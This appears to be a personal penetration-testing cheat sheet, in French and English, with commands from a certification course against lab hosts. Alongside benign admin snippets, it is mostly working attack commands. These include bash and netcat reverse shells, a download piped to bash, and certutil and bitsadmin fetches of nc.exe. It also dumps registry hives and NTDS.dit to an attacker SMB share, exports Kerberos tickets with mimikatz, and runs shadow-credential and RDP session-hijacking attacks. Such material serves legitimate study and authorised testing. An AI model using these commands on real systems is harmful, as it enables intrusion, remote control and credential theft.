# Misc commands

% misc, cpts

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sqli
#cat/UTILS #cpts
[Comment détecter](https://portswigger.net/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities) [Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```
(SELECT SLEEP(5))
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-faire-sur-la-cible
#cat/UTILS #cpts
Après avoir lancé la commande du dessus, on va mettre le process en fond avec **Ctrl-Z** et suivre les commandes ci-dessous :

```
stty raw -echo
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-faire-sur-la-cible-2
#cat/UTILS #cpts
Après avoir lancé la commande du dessus, on va mettre le process en fond avec **Ctrl-Z** et suivre les commandes ci-dessous :

```
export TERM=xterm-256color
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - xss
#cat/UTILS #cpts
[Portswigger course](https://portswigger.net/web-security/cross-site-scripting) [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

```
version animé
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wafw00f
#cat/UTILS #cpts
```
wafw00f <url>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vulnerable-software
#cat/UTILS #cpts
```
dpkg -l
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - users
#cat/UTILS #cpts
```
sudo -l
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - folders
#cat/UTILS #cpts
```
ls -la $folder
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cron-jobs
#cat/UTILS #cpts
```
cat /etc/crontab
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - history-files
#cat/UTILS #cpts
```
tail -n5 /home/*/.bash*
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - network-discovery
#cat/UTILS #cpts
```
for i in {1..254}; do for p in 22 80 443 445; do (timeout 1 bash -c "echo >/dev/tcp/192.168.1.$i/$p 2>/dev/null" && echo "192.168.1.$i:$p" && break) & done; done; wait
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - openvas
#cat/UTILS #cpts
```
sudo apt-get update && apt-get -y full-upgrade
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - openvas-2
#cat/UTILS #cpts
```
sudo apt-get install gvm && openvas
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - users-2
#cat/UTILS #cpts
Qui je suis :

```
$env:USERNAME
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - users-3
#cat/UTILS #cpts
Pour les droits admins true/false

```
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - users-4
#cat/UTILS #cpts
Pour les droits admins true/false

```
net session
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - users-5
#cat/UTILS #cpts
Utilisateur et groupes : - S-1-5-32-544 → Administrators - S-1-5-32-545 → Users - High Mandatory Level → Elevated privileges - Medium Mandatory Level → Standard user privileges

```
whoami /groups
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - users-6
#cat/UTILS #cpts
Droits : - SeBackupPrivilege - SeDebugPrivilege - SeImpersonatePrivilege - etc.

```
whoami /priv
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - folders-2
#cat/UTILS #cpts
```
icacls *
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - folders-3
#cat/UTILS #cpts
This can be used to privesc when the webserver has higher rights and allows uploads. Link the upload folder to the root folder to upload a webshell with elevated rights.

```
"C:\Windows\Tasks\Uploads\317d52e7c825dd847d9c750a35547edc" -Target "C:\xampp\htdocs"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - copy-the-hives
#cat/UTILS #cpts
```
reg.exe save hklm\sam C:\sam.save
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - copy-the-hives-2
#cat/UTILS #cpts
```
reg.exe save hklm\system C:\system.save
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - copy-the-hives-3
#cat/UTILS #cpts
```
reg.exe save hklm\security C:\security.save
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos
#cat/UTILS #cpts
```
sudo apt-get install dislocker
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-4
#cat/UTILS #cpts
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:

```
sudo losetup -f -P Backup.vhd
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-5
#cat/UTILS #cpts
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:

```
sudo losetup --all # look for the .vhd file
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-6
#cat/UTILS #cpts
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:

```
sudo dislocker /dev/loop0p2 -u<user> -- /media/bitlocker
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-7
#cat/UTILS #cpts
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:

```
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-8
#cat/UTILS #cpts
If everything was done correctly, we can now browse the files:

```
cd /media/bitlockermount/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-9
#cat/UTILS #cpts
If everything was done correctly, we can now browse the files:

```
ls -la
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-10
#cat/UTILS #cpts
Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:

```
sudo umount /media/bitlockermount
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mounting-bitlocker-encrypted-drives-in-linux-or-macos-11
#cat/UTILS #cpts
Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:

```
sudo umount /media/bitlocker
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attacking-sam-system-and-security
#cat/UTILS #cpts
Open SMB share

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attacking-sam-system-and-security-2
#cat/UTILS #cpts
Copy the files

```
move sam.save \\10.10.15.16\CompData
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-pypykatz
#cat/UTILS #cpts
The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of the Local Security Authority, then we specify the data sou

```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - msv
#cat/UTILS #cpts
```
== LogonSession ==
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wdigest
#cat/UTILS #cpts
```
== WDIGEST [14ab89]==
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kerberos
#cat/UTILS #cpts
```
== Kerberos ==
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dpapi
#cat/UTILS #cpts
```
== DPAPI [14ab89]==
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attacking-windows-credential-manager
#cat/UTILS #cpts
![09bde4d42072ea3daa496dc97f9de1d7.png](:/7694cb3d2ba5499583a75112acb367b3) It is possible to export Windows Vaults to .crd files either via Control Panel or with the following command. Backups created this way are encry

```
rundll32 keymgr.dll,KRShowKeyMgr
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - attacking-windows-credential-manager-2
#cat/UTILS #cpts
Enumerating credentials with cmdkey

```
whoami
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - hunting-for-credentials
#cat/UTILS #cpts
Key terms to search for : - Passwords - Passphrases - Keys - Username - User account - Creds - Users - Passkeys - configuration - dbcredential - dbpassword - pwd - Login - Credentials [LaZagne](https://github.com/Alessan

```
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - create-the-smb-share-and-copy-the-file
#cat/UTILS #cpts
```
net use n: \\192.168.220.133\share /user:test test
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - php
#cat/UTILS #cpts
```
php -r ' = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",<file>);'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - php-2
#cat/UTILS #cpts
```
php -r 'const BUFFER = 1024; $fremote =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - php-3
#cat/UTILS #cpts
Download with pipe to bash

```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - ruby
#cat/UTILS #cpts
```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vbscript
#cat/UTILS #cpts
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - javascript
#cat/UTILS #cpts
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - bash
#cat/UTILS #cpts
```
cat < /dev/tcp/<ip>/<port> > <file>name
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - nginx-2
#cat/UTILS #cpts
```
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - nginx-3
#cat/UTILS #cpts
Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:

```
server {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - nginx-4
#cat/UTILS #cpts
```
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - nginx-5
#cat/UTILS #cpts
```
sudo systemctl restart nginx.service
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - nginx-6
#cat/UTILS #cpts
```
sudo rm /etc/nginx/sites-enabled/default
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - lolbashttpslolbas-projectgithubio
#cat/UTILS #cpts
To search for download and upload functions in LOLBAS we can use /download or /upload.

```
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - bitsadmin-download-function
#cat/UTILS #cpts
```
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - bitsadmin-download-function-2
#cat/UTILS #cpts
```
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - certutil
#cat/UTILS #cpts
```
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux
#cat/UTILS #cpts
```
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-2
#cat/UTILS #cpts
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> >/tmp/f
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - windows
#cat/UTILS #cpts
Envoyer un shell via un autre user, executer des commandes via un autre user

```
.\RunasCs.exe <user>name <password>word cmd -r <ip>:<port>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - a-faire-depuis-notre-hôte
#cat/UTILS #cpts
```
nc <ip> <port>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vim
#cat/UTILS #cpts
```
:g/TODO/d # Delete all lines containing TODO
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - online-presence
#cat/UTILS #cpts
- Regarder les **DNS Records**

```
dig any <url>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - online-presence-2
#cat/UTILS #cpts
- Google Search for AWS

```
intext:$word inurl:amazonaws.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - online-presence-3
#cat/UTILS #cpts
- Google Search for Azure

```
intext:$word inurl:blob.core.windows.net
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - local-dns-cache-poisoning
#cat/UTILS #cpts
From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/). To exploit the DNS cache

```
cat /etc/ettercap/etter.dns
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - local-dns-cache-poisoning-2
#cat/UTILS #cpts
Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP

```
ping inlanefreight.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-3
#cat/UTILS #cpts
Local DNS Configuration This file has the rndc-key that allows for synchronisation

```
cat /etc/bind/named.conf.local
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-4
#cat/UTILS #cpts
Zone Files

```
cat /etc/bind/db.domain.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-5
#cat/UTILS #cpts
Reverse Name Resolution Zone Files

```
cat /etc/bind/db.10.129.14
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - intercact-from-windows-net-usehttpsdocsmicrosoftcomen-usprevious-versi
#cat/UTILS #cpts
```
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - intercact-from-windows-net-usehttpsdocsmicrosoftcomen-usprevious-versi-2
#cat/UTILS #cpts
```
dir n: /a-d /s /b | find /c ":\"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - interact-from-linux
#cat/UTILS #cpts
```
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - interact-from-linux-2
#cat/UTILS #cpts
/path/credentialFile has this structure :

```
username=plaintext
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumeration
#cat/UTILS #cpts
```
host -t MX hackthebox.eu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - authentication-2
#cat/UTILS #cpts
To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument -M followed by VRFY, EXPN, or RCPT, an

```
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - setting-up
#cat/UTILS #cpts
An Oracle SID (System Identifier) is a unique name that identifies a specific Oracle database instance on a host machine. *If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.

```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings
#cat/UTILS #cpts
- Configuration files are tnsnames.ora/listener.ora and are located here : `$ORACLE_HOME/network/admin` - Oracle 9 default password: `CHANGE_ON_INSTALL` - Oracle 10 no default password set - Oracle DBSNMP default passwor

```
(DESCRIPTION =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-2
#cat/UTILS #cpts
- Configuration files are tnsnames.ora/listener.ora and are located here : `$ORACLE_HOME/network/admin` - Oracle 9 default password: `CHANGE_ON_INSTALL` - Oracle 10 no default password set - Oracle DBSNMP default passwor

```
(ADDRESS_LIST =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-3
#cat/UTILS #cpts
- Configuration files are tnsnames.ora/listener.ora and are located here : `$ORACLE_HOME/network/admin` - Oracle 9 default password: `CHANGE_ON_INSTALL` - Oracle 10 no default password set - Oracle DBSNMP default passwor

```
(ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-4
#cat/UTILS #cpts
- Configuration files are tnsnames.ora/listener.ora and are located here : `$ORACLE_HOME/network/admin` - Oracle 9 default password: `CHANGE_ON_INSTALL` - Oracle 10 no default password set - Oracle DBSNMP default passwor

```
(CONNECT_DATA =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-5
#cat/UTILS #cpts
- Configuration files are tnsnames.ora/listener.ora and are located here : `$ORACLE_HOME/network/admin` - Oracle 9 default password: `CHANGE_ON_INSTALL` - Oracle 10 no default password set - Oracle DBSNMP default passwor

```
(SERVER = DEDICATED)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-6
#cat/UTILS #cpts
- Configuration files are tnsnames.ora/listener.ora and are located here : `$ORACLE_HOME/network/admin` - Oracle 9 default password: `CHANGE_ON_INSTALL` - Oracle 10 no default password set - Oracle DBSNMP default passwor

```
(SERVICE_NAME = orcl)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-7
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(SID_LIST =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-8
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(SID_DESC =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-9
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(SID_NAME = PDB1)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-10
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-11
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(GLOBAL_DBNAME = PDB1)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-12
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(SID_DIRECTORY_LIST =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-13
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(SID_DIRECTORY =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-14
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(DIRECTORY_TYPE = TNS_ADMIN)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-15
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-16
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(DESCRIPTION_LIST =
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-17
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dangerous-settings-18
#cat/UTILS #cpts
**Listener.ora** (server config)

```
(ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - session-hijacking
#cat/UTILS #cpts
As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP. ![edc87d1be5f005edb191

```
net start sessionhijack
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - metasploit
#cat/UTILS #cpts
```
msf6 post(multi/recon/local_exploit_suggester) > run
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - archive-utilisation
#cat/UTILS #cpts
[rar](https://www.rarlab.com/download.htm) Le double archivage en .rar (en supprimant l'extension à chaque fois)

```
rar a ~/test.rar -p ~/test.js
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - msf-specific-search
#cat/UTILS #cpts
```
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - global-variable
#cat/UTILS #cpts
```
setg xxx
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - msf---load-nessus
#cat/UTILS #cpts
```
ls /usr/share/metasploit-framework/plugins
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - creating-shadow-copy-of-c
#cat/UTILS #cpts
We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location s

```
vssadmin CREATE SHADOW /For=C:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - creating-shadow-copy-of-c-2
#cat/UTILS #cpts
We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS.dit
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - creating-shadow-copy-of-c-3
#cat/UTILS #cpts
Students will now have a copy of NTDS.dit in their current working directory. Since NTDS.dit is encrypted with a key stored in SYSTEM, in order to successfully extract the hashes, the students will also need to make a co

```
cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - creating-shadow-copy-of-c-4
#cat/UTILS #cpts
Once the SMB share has been created, now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host.

```
cmd.exe /c move C:\NTDS\NTDS.dit \\$my_ip\share
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - harvesting-kerberos-tickets-from-windows
#cat/UTILS #cpts
On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-a

```
sekurlsa::tickets /export
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pass-the-key-aka-overpass-the-hash
#cat/UTILS #cpts
The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key aka. OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.

```
sekurlsa::ekeys
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - realm---check-if-linux-machine-is-domain-joined
#cat/UTILS #cpts
```
realm list
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - searching-for-ccache-files-in-tmp
#cat/UTILS #cpts
```
ls -la /tmp
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - listing-keytab-file-information
#cat/UTILS #cpts
```
klist -k -t /opt/specialfiles/carlos.keytab
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - impersonating-a-user-with-a-keytab
#cat/UTILS #cpts
```
@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - keytab-extract
#cat/UTILS #cpts
With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password. *Note: A KeyTab file can c

```
su - carlos@inlanefreight.htb
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - installing-kerberos-authentication-package
#cat/UTILS #cpts
```
sudo apt-get install krb5-user -y
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - installing-kerberos-authentication-package-2
#cat/UTILS #cpts
Configuration

```
cat /etc/krb5.conf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shadow-credentials-msds-keycredentiallink
#cat/UTILS #cpts
[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn

```
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shadow-credentials-msds-keycredentiallink-2
#cat/UTILS #cpts
With the TGT obtained, we may once again pass the ticket:

```
export KRB5CCNAME=/tmp/jpinkman.ccache
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - no-pkinit
#cat/UTILS #cpts
In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the ap

```
sudo nano /etc/krb5.conf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - no-pkinit-2
#cat/UTILS #cpts
![4d205c26581e7168d0ee9e45346fb16a.png](:/313228eff815463ea355c0e999b8dbb5)

```
echo "SMTIP dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - meterpreter
#cat/UTILS #cpts
```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cmd
#cat/UTILS #cpts
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - installing-sshuttle
#cat/UTILS #cpts
```
sudo apt-get install sshuttle
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle
#cat/UTILS #cpts
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-2
#cat/UTILS #cpts
```
fw: ip6tables -w -t nat -N sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-3
#cat/UTILS #cpts
```
fw: ip6tables -w -t nat -F sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-4
#cat/UTILS #cpts
```
fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-5
#cat/UTILS #cpts
```
fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-6
#cat/UTILS #cpts
```
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-7
#cat/UTILS #cpts
```
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-8
#cat/UTILS #cpts
```
fw: iptables -w -t nat -N sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-9
#cat/UTILS #cpts
```
fw: iptables -w -t nat -F sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-10
#cat/UTILS #cpts
```
fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-11
#cat/UTILS #cpts
```
fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-12
#cat/UTILS #cpts
```
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-13
#cat/UTILS #cpts
```
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-sshuttle-14
#cat/UTILS #cpts
```
fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - installing-python27
#cat/UTILS #cpts
```
sudo apt-get install python2.7
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-connection-is-established
#cat/UTILS #cpts
```
New connection from host 10.129.202.64, source port 35226
```

